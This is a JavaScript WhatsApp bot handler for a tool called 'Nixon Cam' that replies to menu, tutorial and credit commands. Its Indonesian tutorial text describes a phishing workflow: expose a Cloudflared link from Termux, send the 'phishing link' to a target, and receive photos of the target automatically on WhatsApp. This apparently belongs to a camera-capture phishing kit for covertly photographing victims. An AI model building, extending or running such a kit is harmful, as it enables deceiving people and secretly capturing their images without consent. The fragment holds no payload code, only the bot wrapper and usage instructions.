const fs = require('fs-extra')
const moment = require('moment-timezone')

async function handleMessage(sock, m) {
  const msg = m.messages[0]
  if (!msg.message || msg.key.fromMe) return

  const from = msg.key.remoteJid
  const type = Object.keys(msg.message)[0]
  const body =
    type === 'conversation' ? msg.message.conversation :
    type === 'extendedTextMessage' ? msg.message.extendedTextMessage.text :
    ''

  const prefix = '.'
  if (!body.startsWith(prefix)) return

  const command = body.slice(1).trim().split(/\s+/).shift().toLowerCase()

  if (command === 'menu') {
  await sock.sendMessage(from, {
    text: `*Nixon Cam Commands*
.menu
.tutorial
.credit`
  })

} else if (command === 'tutorial') {
  await sock.sendMessage(from, {
    text: `*Cara Menggunakan Script*
1. Buka Terminal Termux/Panel 
2. Lalu salin link Cloudflared
3. Share link phishing nya ke target
4. Target Akses link
5. Foto otomatis dikirim ke WhatsApp`
  })

} else if (command === 'credit') {
  await sock.sendMessage(from, {
    text: `*Credit*
Thanks to Rhasta/Nixon`
  })
}
}

module.exports = { handleMessage }
